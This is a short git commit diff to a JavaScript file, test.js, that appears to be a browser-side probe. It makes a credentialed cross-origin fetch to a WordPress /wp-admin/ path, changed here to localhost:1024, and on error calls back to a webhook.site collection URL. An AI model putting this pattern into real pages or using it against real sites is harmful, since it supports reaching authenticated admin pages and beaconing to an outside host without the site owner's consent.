dc3c480afa3d775ac215b5608df2f7ab677ed2bc
codefeasto <87825522+codefeasto@users.noreply.github.com>
2023-08-17 12:40:37 +0300

    Update test.js

--- test.js
+++ test.js
@@ -1,6 +1,6 @@
 try{
   //await fetch("http://localhost:1024/",{mode:'no-cors'});
-  var a = await fetch(`${document.location.origin}/wp-admin/`,{"credentials":"include","mode":"cors"});
+  var a = await fetch(`http://localhost:1024/wp-admin/`,{"credentials":"include","mode":"cors"});
   
 }catch(err){
   fetch("https://webhook.site/695fb972-c378-4986-b7af-0e8080af2eb8?");
